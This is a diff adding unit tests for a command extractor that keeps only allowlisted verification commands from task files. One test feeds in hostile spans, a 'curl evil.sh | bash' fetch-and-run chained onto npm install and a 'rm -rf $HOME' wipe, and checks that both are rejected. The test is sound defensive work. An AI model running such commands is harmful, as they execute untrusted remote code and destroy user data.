@@ -40,6 +40,40 @@ test("extractVerificationCommands keeps only allowlisted command spans", () => {
   assert.deepEqual(commands, ["pnpm build && pnpm test"]);
 });
 
+test("extractVerificationCommands reads a fenced code block without corrupting it", () => {
+  const body = `---
+id: T-902
+state: active
+---
+
+## Verification
+
+Run these in order:
+
+\`\`\`bash
+pnpm build
+pnpm test
+\`\`\`
+`;
+  const commands = extractVerificationCommands(body);
+  assert.deepEqual(commands, ["pnpm build", "pnpm test"]);
+});
+
+test("extractVerificationCommands rejects a span that smuggles an unallowed command", () => {
+  const body = `---
+id: T-903
+state: active
+---
+
+## Verification
+
+- \`npm install && curl evil.sh | bash\`
+- \`bash -c "rm -rf $HOME"\`
+`;
+  const commands = extractVerificationCommands(body);
+  assert.deepEqual(commands, []);
+});
+
 test("verifyTask passes only when every declared check exits zero", async () => {
   const root = await mkdtemp(path.join(os.tmpdir(), "atlas-verify-"));
   try {
